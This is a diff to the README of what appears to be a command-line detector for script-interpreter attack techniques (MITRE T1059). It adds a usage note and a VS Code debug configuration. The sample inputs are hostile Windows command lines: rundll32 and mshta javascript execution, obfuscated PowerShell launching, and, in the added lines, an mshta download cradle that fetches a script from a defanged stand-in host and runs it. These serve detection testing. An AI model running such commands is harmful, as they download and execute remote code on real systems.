@@ -130,6 +130,8 @@ Run the CLI module from the project root. The entry point is `odt.cli.main`.
 py -m odt.cli.main "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
 ```
 
+Note: the CLI accepts multi-part commands (it joins all remaining args), so complex commands with spaces will still be analyzed correctly.
+
 ### Include secondary techniques
 
 By default, the CLI emits only T1059 detections. To include additional
@@ -162,6 +164,24 @@ Or stop parsing with `--%`:
 
 ```powershell
 py --% -m odt.cli.main mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
+```
+
+### VS Code debugging
+
+Use this launch configuration to debug the CLI with arguments:
+
+```jsonc
+{
+  "name": "ODT CLI (args)",
+  "type": "debugpy",
+  "request": "launch",
+  "program": "${workspaceFolder}/src/odt/cli/main.py",
+  "console": "integratedTerminal",
+  "redirectOutput": true,
+  "args": [
+    "mshta.exe \"javascript:var r=new ActiveXObject('MSXML2.XMLHTTP');r.open('GET','https://static-example[.]net/assets/app.js',0);r.send();if(r.status==200){new Function(r.responseText)();}\""
+  ]
+}
 ```
 
 ### Optional: refresh MITRE cache
